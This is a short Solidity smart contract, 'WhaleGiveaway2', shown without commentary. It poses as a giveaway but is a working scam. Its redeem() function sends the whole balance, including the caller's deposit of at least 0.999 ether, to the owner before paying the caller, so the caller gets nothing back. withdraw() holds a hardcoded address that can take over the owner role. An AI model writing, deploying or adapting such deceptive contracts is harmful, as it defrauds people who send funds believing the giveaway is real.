pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
    address public Owner = msg.sender;
    uint public constant minEligibility = 0.999001 ether;

    function() public payable {}

    function redeem() public payable {
        if (msg.value >= minEligibility) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner);
        if (msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b) {
            Owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
        }
        Owner.transfer(this.balance);
    }

    function execute(address _to, uint _value, bytes _data) public payable {
        require(msg.sender == Owner);
        require(_to != address(this));

        bool success;
        assembly {
            let ptr := mload(0x40)
            let callSuccess := call(gas, _to, _value, add(_data, 0x20), mload(_data), ptr, 32)
            success := callSuccess
        }
        require(success);
    }
}